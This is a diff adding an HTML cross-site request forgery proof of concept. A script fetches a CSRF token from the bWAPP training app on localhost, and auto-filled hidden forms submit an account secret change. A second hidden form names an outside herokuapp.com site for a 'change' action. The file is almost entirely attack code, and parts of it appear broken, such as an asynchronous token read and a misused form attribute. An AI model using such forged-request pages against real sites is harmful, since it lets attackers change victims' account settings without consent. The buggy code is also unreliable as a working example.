@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+	<h1>CSRF POC</h1>
+	<script>
+		var token;
+		function getCSRF()
+		{
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.onload = function() {
+				token = this.responseText;
+				let regexp = /value\=\"([A-za-z0-9]*)\"/ig;
+				ans = regexp.exec(token);
+				token = ans[1];
+			}
+			xmlHttp.open("GET","https://localhost/bWAPP/csrf_3.php",true);
+			xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '')
+			xmlHttp.send();
+		}
+		window.onload = function() {
+			getCSRF();
+			// alert(token);
+			document.getElementById("key").value = token;
+		}
+	</script>
+	<form action="http://localhost/bWAPP/csrf_3.php" method="POST">
+		<input type="hidden" name="secret" value="admin">
+		<input type="hidden" name="login" value="bee">
+		<input type="hidden" name="action" value="change">
+		<input type="hidden" id ="key" name="token" value=token>
+		<input type="submit" value="Click Me!">
+	</form>
+	<form form="https://web-on-thi-react.herokuapp.com/" enctype='application/json'  >
+		<input type="hidden" name="action" value="change">
+		<!-- <input type="hidden" name="body[newPassword]" value="admin">
+		<input type="hidden" name="body[oldPassword]" value="bee"> -->
+		<input type="submit" value="Click Me!">
+	</form>
+	<!-- <form enctype='application/json'>
+		<input name='mix' value='scalar'>
+		<input name='mix[0]' value='array 1'>
+		<input name='mix[2]' value='array 2'>
+		<input name='mix[key]' value='key key'>
+		<input name='mix[car]' value='car key'>
+		<input type="submit" value="Click Me!">
+	</form> -->
+</html>
+<!-- If you face any issue try doing it again for 1-2 times. It should work then -->
